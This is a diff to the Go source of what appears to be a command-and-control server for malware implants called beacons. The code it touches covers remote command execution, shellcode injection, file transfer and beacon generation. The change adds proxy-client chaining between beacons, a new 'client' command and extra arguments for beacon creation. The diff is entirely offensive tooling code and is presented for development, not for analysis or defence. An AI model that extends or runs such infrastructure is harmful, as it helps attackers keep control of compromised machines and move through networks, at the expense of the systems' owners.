@@ -23,6 +23,7 @@ type CommandUpdate struct {
 	Pid string
 	Pname string
 	Type string
+	ProxyClients []string
 	Data string
 }
 
@@ -39,6 +40,7 @@ type Beacon struct {
 	UploadBuffer []string	
 	ShellcodeBuffer []string
 	ProxyClientBuffer []string
+	ProxyClients []string
 	LastSeen time.Time
 }
 
@@ -62,7 +64,7 @@ var cmdArgs = map[string]string {
 	"listeners": "",
 	"httplistener": "<iface> <hostname> <port>",
     "exec": "<beacon id OR index> <command>...",
-    "create": "<listener> <target> <target arch>",
+    "create": "<listener> <target> <target arch>...",
 	"download": "<beacon id OR index> <remote file> OR <remote file>...",
 	"upload": "<beacon id OR index> <local file> OR <local file>...",
 	"use": "<beacon id OR index>",
@@ -92,7 +94,7 @@ func registerBeacon(updateData CommandUpdate) (*Beacon) {
 	if beacon == nil || beacon.Ip == "n/a" {
 		info("[+] New beacon " + updateData.Id + "@" + updateData.Ip)
 		webInterfaceUpdates = append(webInterfaceUpdates, &WebUpdate{"New Beacon", updateData.Id + "@" + updateData.Ip})
-		beacon = &Beacon { updateData.Ip, updateData.Id, updateData.User, updateData.Platform, updateData.Arch, updateData.Pid, updateData.Pname, nil, nil, nil, nil, nil, time.Now() }
+		beacon = &Beacon { updateData.Ip, updateData.Id, updateData.User, updateData.Platform, updateData.Arch, updateData.Pid, updateData.Pname, nil, nil, nil, nil, nil, nil, time.Now() }
 		beacons = append(beacons, beacon)
 	} else {
 		beacon.LastSeen = time.Now()
@@ -399,7 +401,7 @@ func injectShellcode(cmd []string) {
 }
 
 func notifyBeaconOfProxyUpdate(proxy *Beacon, targetId string) {
-	pseudoBeacon := Beacon { "0.0.0.0", targetId, "",  "", "", "", "", nil, nil, nil, nil, nil, time.Now() }
+	pseudoBeacon := Beacon { "0.0.0.0", targetId, "",  "", "", "", "", nil, nil, nil, nil, nil, nil, time.Now() }
 	data, err := json.Marshal(pseudoBeacon)
 	
 	if err != nil {
@@ -449,11 +451,18 @@ func processInput(input string) {
 			case "exec":
 				execOnBeacon(cmd)
 			case "create":
+				if len(cmd) < 2 {
+					info("[!] Enter a listener ID/number")
+					return
+				}
+
 				l, err := strconv.Atoi(cmd[1])
+				
 				if err != nil {
 					info("usage: " + cmdArgs["create"])
 					return
 				}
+				
 				if len(listeners) <= l || l < 0 {
 					info("Listener " + cmd[1] + " does not exist, list existing listeners with 'listeners'")
 					return
@@ -462,11 +471,13 @@ func processInput(input string) {
 				go func() {
 					redirectStdIn = true
 					if len(cmd) == 2 {
-						createBeacon(l, "windows", "amd64")
+						createBeacon(l, "", "", "")
+					} else if len(cmd) == 5 {
+						createBeacon(l, cmd[2], cmd[3], cmd[4])
 					} else if len(cmd) == 4 {
-						createBeacon(l, cmd[2], cmd[3])
+						createBeacon(l, cmd[2], cmd[3], "")
 					} else {
-						createBeacon(l, "", "")
+						createBeacon(l, "", "", "")
 					}
 					redirectStdIn = false
 				}()
@@ -504,6 +515,18 @@ func processInput(input string) {
 					execOnBeacon(append([]string{"exec"}, cmd...))
 				} else {
 					info("Interact with a beacon first (use).")
+				}
+			case "client":
+				if activeBeacon != nil && len(cmd) == 2 {
+					for i, pBeacon := range activeBeacon.ProxyClients {
+						if pBeacon == cmd[1] {
+							info("Already a client. Resending handshake.")
+							activeBeacon.ProxyClients = append(activeBeacon.ProxyClients[:i], activeBeacon.ProxyClients[i+1:]...)
+						}
+					}
+
+					info("Adding " + cmd[1] + " as client.")
+					notifyBeaconOfProxyUpdate(activeBeacon, cmd[1])
 				}
 			default:
 				info(cmd[0] + " is not a command. Use help to show available commands.")
